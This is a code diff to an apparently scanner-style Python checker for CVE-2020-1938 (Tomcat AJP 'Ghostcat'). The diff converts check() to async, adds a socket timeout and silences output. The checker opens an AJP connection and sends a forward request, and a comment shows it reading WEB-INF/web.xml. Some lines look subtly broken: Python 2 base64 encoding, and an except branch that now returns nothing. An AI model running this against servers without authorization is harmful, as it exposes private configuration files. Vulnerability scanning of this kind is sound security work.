@@ -44,7 +44,7 @@ class CVE_2020_1938_BaseVerify(object):
         fr.attributes = []
         return fr
 
-    def check(self, headers={}, method='GET', user = None, password = None):
+    async def check(self, headers={}, method='GET', user = None, password = None):
     
         """
         检测是否存在漏洞
@@ -56,6 +56,7 @@ class CVE_2020_1938_BaseVerify(object):
         
         try:
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.settimeout(5)
             self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.socket.connect((self.host, int(self.port)))
             self.stream = self.socket.makefile("rb")
@@ -66,7 +67,7 @@ class CVE_2020_1938_BaseVerify(object):
             ]
             self.req_uri = '/'
             self.forward_request = self.prepare_ajp_forward_request(self.host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
-            print("Getting resource at ajp13://%s:%s%s" % (self.host, self.port, self.req_uri))
+            # print("Getting resource at ajp13://%s:%s%s" % (self.host, self.port, self.req_uri))
             if user is not None and password is not None:
                 self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
             for h in headers:
@@ -85,11 +86,11 @@ class CVE_2020_1938_BaseVerify(object):
             #print('存在CVE-2020-1938漏洞,查看WEB-INF/web.xml内容为:', data)
             return True
         except Exception as e:
-            print('不存在CVE-2020-1938漏洞')
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
+    import asyncio
     CVE_2020_1938 = CVE_2020_1938_BaseVerify('http://127.0.0.1:8009')
-    CVE_2020_1938.check()
+    asyncio.run(CVE_2020_1938.check())
+    
